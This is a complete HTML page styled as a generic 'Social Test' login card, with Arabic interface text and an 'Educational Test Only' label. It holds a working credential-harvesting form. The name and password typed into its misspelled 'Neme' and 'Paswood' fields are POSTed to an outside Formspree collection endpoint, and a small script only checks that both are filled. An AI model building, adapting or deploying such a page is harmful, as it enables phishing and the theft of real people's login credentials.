<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Social Test</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #f5f5f5, #e9e9e9);
  font-family: Arial, sans-serif;
}

.card {
  width: 92%;
  max-width: 360px;
  background: white;
  padding: 30px 25px;
  border-radius: 18px;
  box-shadow: 0 8px 30px rgba(0,0,0,.12);
  text-align: center;
}

.logo {
  font-size: 30px;
  font-weight: bold;
  margin-bottom: 25px;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 12px;
  border: 1px solid #ddd;
  border-radius: 8px;
  outline: none;
}

input:focus {
  border-color: #777;
}

button {
  width: 100%;
  padding: 14px;
  border: 0;
  border-radius: 8px;
  background: #222;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: .2s;
}

button:hover {
  transform: scale(1.02);
}

button:active {
  transform: scale(.97);
}

#error {
  color: #d00;
  margin-top: 12px;
  display: none;
}

#success {
  color: green;
  margin-top: 12px;
  display: none;
}

.note {
  margin-top: 18px;
  font-size: 12px;
  color: #777;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">Social Test</div>

  <form id="testForm"
        action="https://formspree.io/f/xrpzoaod"
        method="POST">

    <input
      type="text"
      name="Neme"
      placeholder="Neme"
      required
    >

    <input
      type="text"
      name="Paswood"
      placeholder="Paswood - بيانات تجريبية"
      required
    >

    <button type="submit">إرسال</button>

    <div id="error">عمّر الخانتين أولاً.</div>
    <div id="success">تم الإرسال بنجاح ✅</div>

  </form>

  <div class="note">
    Educational Test Only
  </div>

</div>

<script>
const form = document.getElementById("testForm");
const error = document.getElementById("error");
const success = document.getElementById("success");

form.addEventListener("submit", function(e) {

  const inputs = form.querySelectorAll("input");

  if (!inputs[0].value.trim() || !inputs[1].value.trim()) {
    e.preventDefault();
    error.style.display = "block";
    success.style.display = "none";
    return;
  }

  error.style.display = "none";
});
</script>

</body>
</html>
